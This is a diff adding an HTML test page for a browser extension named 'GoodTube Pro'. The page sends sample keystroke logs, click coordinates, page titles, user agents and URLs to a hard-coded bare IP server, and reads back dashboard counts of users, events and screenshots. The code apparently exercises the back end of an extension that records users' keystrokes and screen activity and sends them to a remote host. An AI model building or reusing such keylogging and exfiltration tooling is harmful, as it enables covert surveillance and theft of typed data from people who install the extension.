@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GoodTube Pro Analytics Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .test-section {
+            margin: 2rem 0;
+            padding: 1rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .test-section h3 {
+            margin-top: 0;
+            color: #333;
+        }
+        button {
+            background: #8B5CF6;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 0.5rem;
+        }
+        button:hover {
+            background: #7C3AED;
+        }
+        .status {
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+        .status.success {
+            background: #D1FAE5;
+            border: 1px solid #10B981;
+            color: #065F46;
+        }
+        .status.error {
+            background: #FEE2E2;
+            border: 1px solid #EF4444;
+            color: #991B1B;
+        }
+        .status.info {
+            background: #DBEAFE;
+            border: 1px solid #3B82F6;
+            color: #1E40AF;
+        }
+        #log {
+            background: #1F2937;
+            color: #F9FAFB;
+            padding: 1rem;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.875rem;
+            max-height: 300px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ GoodTube Pro Analytics Test</h1>
+        <p>This page tests the analytics functionality of the GoodTube Pro extension.</p>
+        
+        <div class="status info">
+            <strong>Server:</strong> http://134.199.235.218<br>
+            <strong>Status:</strong> <span id="serverStatus">Checking...</span>
+        </div>
+        
+        <div class="test-section">
+            <h3>📊 Analytics Tests</h3>
+            <button onclick="testBasicAnalytics()">Test Basic Analytics</button>
+            <button onclick="testKeystrokeLogging()">Test Keystroke Logging</button>
+            <button onclick="testClickTracking()">Test Click Tracking</button>
+            <button onclick="testPageActivity()">Test Page Activity</button>
+            <button onclick="checkDashboard()">Check Dashboard</button>
+        </div>
+        
+        <div class="test-section">
+            <h3>🔍 Manual Tests</h3>
+            <p>Type something here to test keystroke logging:</p>
+            <input type="text" placeholder="Type here to generate keystrokes..." style="width: 100%; padding: 0.5rem;">
+            
+            <p>Click these buttons to test click tracking:</p>
+            <button onclick="logClick('Button 1')">Test Button 1</button>
+            <button onclick="logClick('Button 2')">Test Button 2</button>
+            <button onclick="logClick('Button 3')">Test Button 3</button>
+        </div>
+        
+        <div class="test-section">
+            <h3>📝 Console Log</h3>
+            <div id="log"></div>
+            <button onclick="clearLog()">Clear Log</button>
+        </div>
+    </div>
+
+    <script>
+        let logElement = document.getElementById('log');
+        
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logMessage = `[${timestamp}] ${message}\n`;
+            logElement.textContent += logMessage;
+            logElement.scrollTop = logElement.scrollHeight;
+            
+            console.log(message);
+        }
+        
+        function clearLog() {
+            logElement.textContent = '';
+        }
+        
+        async function checkServerStatus() {
+            try {
+                const response = await fetch('http://134.199.235.218/api/stats');
+                if (response.ok) {
+                    document.getElementById('serverStatus').textContent = '✅ Online';
+                    document.getElementById('serverStatus').parentElement.className = 'status success';
+                    log('✅ Server is online and responding');
+                } else {
+                    document.getElementById('serverStatus').textContent = '❌ Error ' + response.status;
+                    document.getElementById('serverStatus').parentElement.className = 'status error';
+                    log('❌ Server error: ' + response.status);
+                }
+            } catch (error) {
+                document.getElementById('serverStatus').textContent = '❌ Offline';
+                document.getElementById('serverStatus').parentElement.className = 'status error';
+                log('❌ Server is offline: ' + error.message);
+            }
+        }
+        
+        async function testBasicAnalytics() {
+            log('🧪 Testing basic analytics...');
+            
+            try {
+                const payload = {
+                    userId: 'test_user_' + Date.now(),
+                    sessionId: 'test_session_' + Date.now(),
+                    events: [{
+                        type: 'test_event',
+                        data: { test: true, timestamp: Date.now() },
+                        url: window.location.href,
+                        timestamp: Date.now()
+                    }],
+                    keystrokes: []
+                };
+                
+                const response = await fetch('http://134.199.235.218/api/analytics', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (response.ok) {
+                    log('✅ Basic analytics test successful');
+                } else {
+                    log('❌ Basic analytics test failed: ' + response.status);
+                }
+            } catch (error) {
+                log('❌ Basic analytics test error: ' + error.message);
+            }
+        }
+        
+        async function testKeystrokeLogging() {
+            log('🧪 Testing keystroke logging...');
+            
+            try {
+                const payload = {
+                    userId: 'test_user_' + Date.now(),
+                    sessionId: 'test_session_' + Date.now(),
+                    events: [],
+                    keystrokes: [
+                        { key: 't', url: window.location.href, timestamp: Date.now() },
+                        { key: 'e', url: window.location.href, timestamp: Date.now() + 1 },
+                        { key: 's', url: window.location.href, timestamp: Date.now() + 2 },
+                        { key: 't', url: window.location.href, timestamp: Date.now() + 3 }
+                    ]
+                };
+                
+                const response = await fetch('http://134.199.235.218/api/analytics', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (response.ok) {
+                    log('✅ Keystroke logging test successful');
+                } else {
+                    log('❌ Keystroke logging test failed: ' + response.status);
+                }
+            } catch (error) {
+                log('❌ Keystroke logging test error: ' + error.message);
+            }
+        }
+        
+        async function testClickTracking() {
+            log('🧪 Testing click tracking...');
+            
+            try {
+                const payload = {
+                    userId: 'test_user_' + Date.now(),
+                    sessionId: 'test_session_' + Date.now(),
+                    events: [{
+                        type: 'click',
+                        data: { 
+                            target: 'BUTTON',
+                            x: 100,
+                            y: 200,
+                            test: true
+                        },
+                        url: window.location.href,
+                        timestamp: Date.now()
+                    }],
+                    keystrokes: []
+                };
+                
+                const response = await fetch('http://134.199.235.218/api/analytics', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (response.ok) {
+                    log('✅ Click tracking test successful');
+                } else {
+                    log('❌ Click tracking test failed: ' + response.status);
+                }
+            } catch (error) {
+                log('❌ Click tracking test error: ' + error.message);
+            }
+        }
+        
+        async function testPageActivity() {
+            log('🧪 Testing page activity tracking...');
+            
+            try {
+                const payload = {
+                    userId: 'test_user_' + Date.now(),
+                    sessionId: 'test_session_' + Date.now(),
+                    events: [{
+                        type: 'page_activity',
+                        data: { 
+                            title: document.title,
+                            userAgent: navigator.userAgent,
+                            test: true
+                        },
+                        url: window.location.href,
+                        timestamp: Date.now()
+                    }],
+                    keystrokes: []
+                };
+                
+                const response = await fetch('http://134.199.235.218/api/analytics', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (response.ok) {
+                    log('✅ Page activity test successful');
+                } else {
+                    log('❌ Page activity test failed: ' + response.status);
+                }
+            } catch (error) {
+                log('❌ Page activity test error: ' + error.message);
+            }
+        }
+        
+        async function checkDashboard() {
+            log('🧪 Checking dashboard data...');
+            
+            try {
+                const response = await fetch('http://134.199.235.218/api/stats');
+                if (response.ok) {
+                    const data = await response.json();
+                    log('✅ Dashboard data retrieved:');
+                    log(`   Users: ${data.totalUsers}`);
+                    log(`   Events: ${data.totalEvents}`);
+                    log(`   Screenshots: ${data.totalScreenshots}`);
+                    log(`   Recent events: ${data.recentEvents?.length || 0}`);
+                } else {
+                    log('❌ Dashboard check failed: ' + response.status);
+                }
+            } catch (error) {
+                log('❌ Dashboard check error: ' + error.message);
+            }
+        }
+        
+        function logClick(buttonName) {
+            log(`🖱️ Clicked: ${buttonName}`);
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            log('🚀 Analytics test page loaded');
+            checkServerStatus();
+            
+            // Test if extension is loaded
+            setTimeout(() => {
+                if (window.GoodTubeContentScript) {
+                    log('✅ GoodTube Pro extension detected');
+                } else {
+                    log('⚠️ GoodTube Pro extension not detected - install and reload');
+                }
+            }, 1000);
+        });
+        
+        // Auto-refresh server status every 30 seconds
+        setInterval(checkServerStatus, 30000);
+    </script>
+</body>
+</html>
+
